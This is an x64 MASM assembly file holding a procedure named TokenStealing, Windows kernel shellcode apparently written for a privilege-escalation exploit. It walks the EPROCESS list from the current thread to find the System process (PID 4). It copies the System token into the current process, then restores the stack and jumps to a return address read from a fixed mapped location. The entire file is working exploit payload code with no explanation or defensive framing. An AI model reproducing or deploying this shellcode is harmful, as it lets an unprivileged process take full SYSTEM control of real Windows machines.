_TEXT	SEGMENT

TokenStealing PROC
	get_eproc:
	mov		rax, qword ptr [00000002a0000080h]		;
	xor     rcx, rcx								;
	mov     qword ptr [rax], rcx					;
	xor     rax, rax								;
	mov     rax, qword ptr gs:[rax+188h]			;
	mov     rax, qword ptr [rax+0B8h]				;
	mov     r8, rax									;
	parse_eproc:
	mov     rax, qword ptr [rax+448h]				;
	sub     rax, 448h								;
	mov     rcx, qword ptr [rax+440h]				;
	cmp     rcx, 4									;
	jne     parse_eproc								;
	steal_token:
	mov     r9, qword ptr [rax+4B8h]				;
	mov     qword ptr [r8+4B8h], r9					;
	mov		rax, qword ptr [00000002a0000088h]		;
	mov     rsp, rsi								;
	sub     rsp, 20h								;
	jmp     rax										;

TokenStealing ENDP

_TEXT	ENDS

End
